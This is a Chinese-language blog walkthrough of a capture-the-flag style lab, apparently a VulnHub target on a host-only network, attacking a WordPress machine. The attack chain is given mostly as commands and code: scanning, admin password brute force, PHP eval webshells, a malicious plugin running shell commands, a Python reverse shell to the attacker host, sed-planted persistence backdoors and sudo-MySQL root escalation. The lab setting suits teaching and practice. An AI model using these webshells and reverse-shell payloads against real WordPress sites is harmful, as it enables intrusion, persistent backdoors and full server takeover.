@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+
+<!--欢迎来到hk987，人类的进化就靠你了-->
+ <!--
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░▒▓█▓▒░ 
+░▒▓████████▓▒░▒▓███████▓▒░░░▒▓███████▓▒░░▒▓██████▓▒░░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░▒▓█▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░░░▒▓█▓▒░
+-->
+<!--
+  无人扶我青云志，
+	我自踏雪至山巅，
+	倘若命中无此运，
+	孤身亦可登昆仑。
+-->
+<!--Copyright©hk987.xyz-->
+<!--PC端Google和Firefox支持良好,移动端支持良好-->
+
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="-hk987-">
+	<meta name="author" content="hk987">
+	<meta name="keywords" content="hk987,hk987.xyz,hack987,黑客987,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker,网络安全,信息安全,网络安全学习,计算机小白,网安入门,网络安全入门,渗透测试,黑客技术,网络基础入门,操作系统,新手学电脑,小白学电脑,hack学习,hack入门,Windows基础,linux基础,Archlinux基础,Rust基础,Rust入门,Rust编程基础,黑客入门,Ubuntu入门,Manjaro,Endeavouros,红帽系统,centos基础学习,Rocky系统基础,Linux基础命令,Windows批处理,Windows安全,Linux安全,Kali基础,Kali渗透测试,KaliLinux,BlackArch,Github,加密解密,具体数学,线性代数,离散数学,红队攻防,蓝队攻防,黑客靶场练习,黑客靶场,黑客实战,hack实战,hack编程,黑客编程">
+	<title>[Hack实战]-4-靶机红队攻防实验 - hk987.xyz - www.hk987.xyz</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/home.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!--prism.js代码高亮模块-->
+	<link rel="stylesheet" href="../css/prism.css" data-noprefix />
+	<script src="../plugins/prism.js"></script>
+	<!--/prism.js代码高亮模块-->
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container">
+				<!-- 根大纲-->
+				<a href="../index.html" title="Hk987首页">
+					<h1 class="nav-logo">HK987 - hk987.xyz</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					 S=−k∑pilnpi
+				</h2>
+				<nav class="nav-links">
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1>
+					<ul>
+						<li>
+							<a href="../index.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">wiki</span></span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Hack实战]-4-靶机红队攻防实验</h1>	
+				</header>
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>中等难度，靶机红队攻防实验#第4篇，主要涉及Wordpress目录探测，管理员密码暴力破解，一句话木马应用，BurpSuite的截断重发等。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					 <ul class="contents">	
+						 <li><a href="#Penetration-1">0×1.环境介绍</a></li>
+						 <li><a href="#Penetration-2">0×2.实战命令</a></li>
+						 <li><a href="#Penetration-3">0×3.视频演示</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+
+					<h2 id="Penetration-1">0×1.环境介绍</h2>
+
+					<p>攻击主机与靶机放在VirtualBox虚拟机的Host-only下</p>
+					<p>kali主机在VirtualBox虚拟机中，第一块网卡配置成NAT（用于联网更新软件），第二块网卡配置成Host-Only（用于和靶机通讯）</p>
+					<p>重点：kali主机需要删除/etc/NetworkManager/system-connections/目录下面所有配置文件，否则无法两块网卡同时启用</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#使用root权限，删除system-connections目录中所有配置文件，这样kali的双网卡就能同时启动了
+					#如果不这样做，很可能出现一块网卡不能启动的问题
+					rm -rf /etc/NetworkManager/system-connections/*
+					</code>
+					</pre>
+					<p>攻击Kali主机Host-Only网卡IP：192.168.56.3</p>
+					<p>攻击主机与靶机在同一个Host-Only网段192.168.56.0/24</p>
+
+					<h2 id="Penetration-2">0×2.实战命令</h2>
+					<p>下面的所有命令都使用root用户执行，如果是普通用户，请在命令前面添加sudo，</p>
+					<p>● 局域网发现</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#使用nmap做主机发现
+					nmap -sn 192.168.56.0/24
+
+					#-sn通过发送多种探测数据包（如ICMP Echo Request、TCP SYN到端口443、TCP ACK到端口80等）判断目标主机是否响应。
+					#若主机在线，会返回对应协议的数据包（如ICMP Echo Reply或TCP RST）
+					#若目标主机与扫描设备在同一局域网，nmap会优先发送ARP请求（Address Resolution Protocol），通过MAC地址解析快速判断主机状态
+					</code>
+					</pre>
+
+					<p>● 三层端口扫描+服务探测</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#假设上一步探测到的靶机ip是192.168.56.7
+					nmap -p- 192.168.56.7
+					nmap -p80 -sV 192.168.56.7
+					</code>
+					</pre>
+
+					<p>● 对Web服务做路径探测</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#除了dirsearch，feroxbuster也能做路径探测，kali默认没有安装
+					apt update
+					apt install feroxbuster
+
+					#feroxbuster路径发现工具默认会调用/usr/share/seclists中的字典文件
+					#在kali中seclists并没有默认安装
+					apt install seclists
+
+					#开始路径探测
+					feroxbuster --url http://192.168.56.7
+					
+					#可以指定字典文件
+					feroxbuster --url http://192.168.56.7 -w /usr/share/dirb/wordlist/common.txt
+
+					#在Kali Linux系统中，/usr/share/dirb/wordlists目录主要用于存放Dirb工具的专用字典文件，这些字典主要用于目录枚举、路径探测等场景。
+					</code>
+					</pre>
+
+					<p>扫描发现了http://192.168.56.7/wordpress目录
+					当我们用浏览器打开这个页面的时候，发现加载十分的缓慢，这个加载缓慢肯定是有原因的，我们用burpsuite打开看一下，设置firefox的proxy指向burpsuite的8080端口，然后刷新http://192.168.56.7/wordpress页面，在proxy的HTTP history选项卡中，发现在访问http://192.168.56.7/wordpress的时候，给我们返回的Response里面，在代码中嵌入了大量的192.168.159.145这个地址，因为这个地址无法正常访问，导致了资源加载的缓慢；</p>	
+
+					<p>而通过源码不难判断，这台靶机原来的ip地址应该是192.168.159.145这个地址，只不过作者应该是有意将这个地址写死在了代码里面，所以我们现在需要需要使用burpsuite的请求替换功能，将这些错误的地址请求全部替换成现在这台靶机的ip地址，也就是192.168.56.7这个地址</p>	
+
+					<p>● burpsuite请求替换功能</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#打开BurpSuite的Match and Replace选项卡
+					Proxy>Options>Match and Replace
+
+					#因为192.168.159.145这个地址是我们尝试Get http://192.168.56.7/wordpress页面时
+					#从服务端向我们的浏览器返回的数据包中携带的
+					#所以我们需要替换的是返回的数据包包头和返回的数据包内的IP地址
+					#Header替换
+					add>type Response header
+					Match 192.168.159.145
+					Replace 192.168.56.7
+					#Body替换
+					add>type Response body
+					Match 192.168.159.145
+					Replace 192.168.56.7
+					</code>
+					</pre>
+
+					<p>通过上面的设置之后，再次刷新页面，就能够快速打开，看到完整页面内容了，然后对页面做一个简单的信息收集，对输入框做一个SQL注入测试，发现并没有明显的漏洞。</p>
+
+					<p>打开http://192.168.56.7/wordpress/admin后台页面，通过wordpress后台手工的登录测试，可以发现admin这个默认的管理员名称。</p>
+
+					<p>● burpsuite进行wordpress后台密码爆破</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#打开burpsuite流量拦截功能
+					proxy>Intercept>Intercept is on
+
+					#使用admin这个用户名在wordpress后台提交一个错误的密码
+					#将捕获的数据包发送到Intruder
+					#使用Intruder的数据重放能力进行暴力破解
+					#将密码字段add成一个数据的替换点再选择Intruder中的Payloads功能
+
+					  1.将Payload type设置成Runtime file
+					#Runtime file需为文本文件，每行包含一个字符串，支持任意字符组合
+					#将Payload字典设置为runtime类型主要是为了动态加载大文件字典
+					#避免一次性将全部内容加载到内存中导致内存溢出或性能下降
+
+					  2.Payload Options设置中选择密码字典文件
+						(选择的文件路径不能包含中文)
+					
+					#superwordlist中包含的对wordpress密码破解字典
+					MidPwds.txt
+
+					  3.Start attack
+
+					#爆破出来 用户名 admin 密码 adam14
+					</code>
+					</pre>
+
+					<p>● Wordpress后台提权的三种常规思路</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					1，使用图片文件上传功能（Media）
+					如果目标的wordpress版本存在漏洞，可以通过图片上传功能直接上传webshell
+
+					2，修改现有模板文件，插件文件，在例如404文件中，添加一句话木马
+					通过样式（Appearance>Theme Editor)编辑>404 Template
+
+					3，自定义一个shell插件上传安装激活（Activate Plugin）
+					</code>
+					</pre>
+
+					<p>● 一句话木马和自制Wordpress插件</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-php">
+					#一句话木马，连接密码是hkmm
+					&lt;?php eval($_POST['hkmm']);?&gt;
+
+					#php代码文件内
+					 eval($_POST['hkmm']);
+
+					#自制shell插件
+					 vim hkmm.php
+
+					 &lt;?php
+					 /**
+					 * Plugin Name: Hacker cute girl's playground
+					 * Plugin URI: https://space.bilibili.com/3494364789607153
+					 * Description: WP Hacker cute girl's playground
+					 * Version: 1.0
+					 * Author: hkmm
+					 * Author URI: https://space.bilibili.com/3494364789607153
+					 * License: https://space.bilibili.com/3494364789607153
+					 */
+
+					 if(isset($_GET['hkmm']))
+					     {
+					         system($_GET['hkmm']);
+					     }
+					 ?&gt;
+
+					#这段PHP代码的功能是通过GET参数动态执行系统命令，但存在严重的安全风险。以下是详细解析：
+					#参数检测
+					if(isset($_GET['hkmm']))：检查URL中是否存在名为hkmm的GET参数。
+					若存在，isset()返回true，否则为false。
+					#命令执行
+					system($_GET['hkmm'])：若hkmm参数存在，使用system()函数直接执行该参数的值。例如：
+					访问http://example.com/script.php?hkmm=ls会列出当前目录文件。
+					访问http://example.com/script.php?hkmm=whoami会返回服务器用户名。
+					</code>
+					</pre>
+
+					<p>● wordpress插件上传</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#wordpress插件需要是zip格式
+					 zip hkmm.zip hkmm.php
+
+					#wordpress插件路径
+					 /wordpress主目录/wp-content/plugins/
+
+					#hkmm.php调用方法
+					/wordpress主目录/wp-content/plugins/s.php?hkmm=id
+					/wordpress主目录/wp-content/plugins/s.php?hkmm=ls
+					/wordpress主目录/wp-content/plugins/s.php?hkmm=which nc
+					http://192.168.56.7/wordpress/wp-content/plugins/hkmm.php?hkmm=ls%20/usr/bin%20|grep%20python
+					http://192.168.56.7/wordpress/wp-content/plugins/hkmm.php?hkmm=ls /usr/bin | grep python
+					</code>
+					</pre>
+
+					<p>● 使用python获得反弹shell</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#kali监听
+					nc -nvlp 2333
+
+					#既然目标机器包含python3，那么就用python3获得反弹shell
+					http://192.168.56.7/wordpress/wp-content/plugins/hkmm.php?hkmm=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.3",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+					</code>
+					</pre>
+
+					<p>● 使用msf获得反弹shell</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#需要知道目标wordpress的管理员用户名密码
+					#反弹shell之msf，启动msf
+					msfdb run
+
+					#查找wordpress反弹shell相关模块
+					search wordpress admin_shell
+					
+					#查找出来的模块，可以使用“use 模块前的ID”来调用模块
+					use 0
+
+					#配置参数
+					show options
+					#管理员密码
+					set PASSWORD adam14
+					#靶机IP
+					set RHOSTS 192.168.56.7
+					#wordpress目录
+					set TARGETURI /wordpress
+					#管理员用户名
+					set USERNAME admin
+					#如果本地有多块网卡，设置用本地那块网卡连接
+					set LHOST 192.168.56.7 
+					run #执行
+					shell #得到meterpreter进入shell环境
+					！！！(缺点，及其不稳定，部分命令无法正常使用，不推荐)！！！
+					</code>
+					</pre>
+
+					<p>● 巩固shell</p>
+				  <p>当我们拿下一个shell之后，一定要想办法巩固shell，最少能够有2~3种shell连接方式。</p>
+				  <pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+				  <code class="language-bash">
+					#通过python3获得反弹shell之后，可以修改404文件再嵌入一句话木马
+					#模板文件位置
+					/var/www/html/wordpress/wp-content/themes 
+					#可以在后台查看使用的是哪个模板，然后修改对应模板的404文件
+					/var/www/html/wordpress/wp-content/themes/twentytwentyone/404.php
+
+					#在没有办法使用vim的不完整反弹shell中，利用sed插入一句话木马
+
+					#在404.php文件的get_header();上面插入一行
+					sed -i '/get_header();/i\eval($_POST['ant']);' 404.php
+
+					#如果是要在get_header();之后插入一句话，用/a参数
+					sed -i '/get_header();/a\eval($_POST['ant']);' 404.php
+					</code>
+					</pre>
+
+					<p>● 将功能不全的反弹shell升级成完整功能shell的方法</p>
+				  <pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+				  <code class="language-bash">
+					#如果对应主机上的shell的交互功能不完整，可以使用下面的方法完善交互功能
+					（仅适用于bashshell）
+					#查看当前使用的shell
+					echo $SHELL
+
+					#将kali的zsh shell更改成bash
+					chsh -s /bin/bash
+
+					#先使用反弹shell连接到nc
+					#按ctrl+z将kali的nc连接放到后台，依次输入下面的指令
+					stty raw -echo
+					fg
+					ls
+					export SHELL=/bin/bash
+					export TERM=screen
+					stty rows 38 columns 116
+					reset
+
+					#这些操作通过优化终端环境配置和启用交互式Shell特性，使反弹的远程Shell支持代码自动补齐功能。以下是具体解析：
+					stty raw -echo
+					👉 关键修复命令：
+					stty raw：将终端设置为原始模式（禁用缓冲和特殊字符处理，如 Ctrl+C）。
+					-echo：禁用输入回显（避免按键回显混乱）。
+
+					fg
+					👉 将后台挂起的反弹 Shell 会话恢复到前台（fg = foreground）。
+
+					ls
+					👉 执行 ls 命令验证终端功能是否正常（非必须，但可测试交互性）。
+
+					export SHELL=/bin/bash
+					👉 强制指定当前 Shell 类型为 Bash（覆盖某些环境中的错误配置）。
+					export TERM=screen
+					👉 设置终端类型为 screen，兼容性更好（支持更多终端功能，如颜色、光标移动）。
+
+					stty rows 38 columns 116
+					👉 手动指定终端的行数和列数，使其与本地终端实际尺寸匹配（可通过 stty size 查看本地值）。
+
+					reset
+					👉 重置终端，应用所有配置变更并清除显示异常。
+					</code>
+					</pre>
+					<p>使用上述方法修复之后，就能够使用完整的终端功能了，包括命令补齐，vim命令等。</p>
+
+
+					<p>● 使用AntSword连接一句话木马</p>
+
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#在启用AntSword之前，如果是windows，一定要先关闭病毒与威胁防护的实时保护功能
+					#启动菜单-设置-隐私与安全-windows安全中心-病毒与威胁防护（设置）-管理设置-实时保护（关掉）
+					#否则无法打开下载AntSword的关键模块
+					#然后使用AntSword连接藏有一句话木马的文件即可
+					http://192.168.56.7/wordpress/wp-content/themes/twentytwentyone/404.php
+					</code>
+					</pre>
+
+					<p>● 利用数据库提权</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#查看wordpress下的wp-config.php能够查看到数据库的用户名和密码
+
+					#查看系统的/etc/passwd文件，发现名为wpadmin的用户
+					#使用数据库root密码尝试登录wpadmin的用户（失败）
+
+					#尝试用wp-config.php中的数据库用户名和密码登录数据库（失败）
+					mysql -u admin -p Wp_Admin#123 -D wordpress
+
+					#尝试用之前破解出来的wordpress管理员后台密码adam14登录wpadmin（成功）
+					#通过新用户的sudo -l命令查看（突破口），发现wpadmin可以使用sudo命令root权限访问数据库
+					#使用sudo root权限登录数据库，密码任然是admin web密码
+
+					#尝试数据库中执行system命令，看看当前数据库是否允许执行system命令
+					system id
+
+					#因为我们是使用root权限打开的数据库
+					#所以可以使用system命令执行bash，就会在当前进程下面生成一个子进程，因为其父进程拥有root权限
+					#所以创建子进程继承了父进程的权限，从而我们获得了一个拥有root权限的bash shell
+					\! /bin/bash
+					system /bin/bash
+					</code>
+					</pre>
+					
+					<h2 id="Penetration-3">0×3.视频演示</h2>
+
+					<p>点击下方视频标题，可以进入B站观看高清版本</p>
+					<p>【第31天】渗透测试实战#5-大1女新生挑战一年精通网络安全-渗透测试-红队渗透-安全攻防-靶机攻防-渗透实战</p>
+					<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=114351943979212&bvid=BV1sZ5YzXEGT&cid=29461253312&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" ></iframe>
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="hk987.xyz" style="color: rgb(4,181,150);" href="https://www.hk987.xyz" target="_blank">hk987.xyz</a>
+					</p>
+					<p>*原文连接:<a title="[Hack实战]-4-靶机红队攻防实验#第4篇" style="color: rgb(4,181,150);" href="https://www.hk987.xyz/hk/hack-04.html" target="_blank">https://www.hk987.xyz/hk/hack-04.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			hk987.xyz &nbsp;<img src="../logo/copyright.png" alt="未经作者允许,禁止任何形式的复制与转载" title="未经作者允许,禁止任何形式的复制与转载">&nbsp;All Rights Reserved.
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
